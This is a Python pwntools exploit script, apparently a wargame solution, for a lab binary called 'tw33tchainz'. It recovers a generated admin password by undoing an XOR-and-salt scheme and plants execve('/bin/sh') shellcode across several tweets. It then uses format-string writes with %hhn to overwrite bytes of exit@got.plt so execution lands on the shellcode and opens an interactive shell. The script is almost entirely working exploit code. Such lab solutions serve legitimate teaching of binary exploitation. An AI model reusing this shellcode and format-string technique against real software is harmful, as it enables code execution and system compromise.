from pwn import *
import struct

r = process("/levels/project1/tw33tchainz")
log.info("PID: {}".format(util.proc.pidof(r)))
pause()

TWEET = "1\n"
VIEW = "2\n"
ADMIN = "3\n"
QUIT = "5\n"

r.send("                                       \n") # Username and password
r.readuntil("Generated Password:\n")
buf = r.read()
password = buf.split("\n")[0].decode("hex")
log.info("Password: {}".format(password.encode("hex")))
# They print as four ints, so we need to swap the endianness
swap_pass = ""
for i in range(0, 16, 4):
    swap_pass += struct.pack("<I", struct.unpack(">I", password[i:i+4])[0])
log.info("Swapped password: {}".format(swap_pass.encode("hex")))
username = " " * 15 + "\x00"
salt = " " * 15 + "\x00"
# Figure out the generated password
secret_pass = "".join([chr(((ord(swap_pass[i]) ^ ord(username[i])) - ord(salt[i])) % 0x100) for i in range(16)])
log.info("Secret password: {}".format(secret_pass.encode('hex')))
r.send(TWEET)
r.send("bla\n\n")
r.send(TWEET)
r.send("\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x90\xEB\x10\n\n")
r.send(TWEET)
r.send("\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80\n\n")
# Write first format string
r.send(TWEET)
# -- Write 0xe0 (224) to third byte of `exit@got.plt`
r.send("_\x3d\xd0\x04\x08" + "%219x" + "%8$hhn" + "\n\n")
# Login here, 'allowing' format string vuln
r.send(ADMIN)
r.send(secret_pass + "\n\n")
# Write other byte
r.send(TWEET)
# -- Write 0x40 (64) to LSB of `exit@got.plt`
r.send("_\x3c\xd0\x04\x08" + "%59x" + "%8$hhn" + "\n\n")
# This stops the format string from running again
r.send(TWEET)
r.send("bla\n\n")
r.send(QUIT)
r.interactive()
